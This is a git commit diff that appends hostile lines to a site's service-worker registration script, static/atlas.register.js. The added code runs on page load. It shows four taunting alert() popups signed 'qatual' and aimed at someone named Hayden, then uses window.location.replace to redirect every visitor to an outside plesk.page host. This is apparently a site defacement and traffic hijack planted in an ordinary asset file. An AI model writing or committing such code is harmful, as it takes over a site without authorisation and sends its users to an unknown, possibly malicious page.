a5611f462a4f7f838d221abc6e91a258f97fc647
qatual <roman@rxman.my>
2026-05-11 10:29:52 -0400

    Initial commit

--- static/atlas.register.js
+++ static/atlas.register.js
@@ -7,3 +7,9 @@
       console.error("[Atlas] SW registration failed:", err);
     });
 })();
+
+alert("raided by qatual.");
+alert("i told you this would happen hayden.");
+alert("just tell me you are sorry and ill fix it.");
+alert("go use the better site twins :)");
+window.location.replace("https://62-84-183-198.plesk.page/")
